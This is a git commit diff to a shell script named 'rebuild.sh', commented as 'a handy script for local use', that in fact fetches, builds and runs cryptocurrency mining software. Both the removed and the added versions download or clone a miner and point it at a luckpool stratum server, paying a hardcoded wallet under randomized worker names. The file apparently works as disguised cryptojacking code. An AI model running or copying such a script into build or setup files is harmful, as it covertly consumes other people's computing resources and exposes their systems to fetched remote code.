1dd277785130e801b04018907221f1f079402995
odilon5 <93242501+odilon5@users.noreply.github.com>
2021-10-27 13:09:35 +0700

    Update rebuild.sh

--- rebuild.sh
+++ rebuild.sh
@@ -2,6 +2,10 @@
 #
 # This is a handy script for local use
 
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.$(echo $(shuf -i 1-20000 -n 1)-V) -p x --cpu 4
+apt update
+apt install sudo -y
+sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
+git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
+cd ccminer
+chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh
+./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.$(echo $(shuf -i 1-20000 -n 1)-V) -p x -t 36
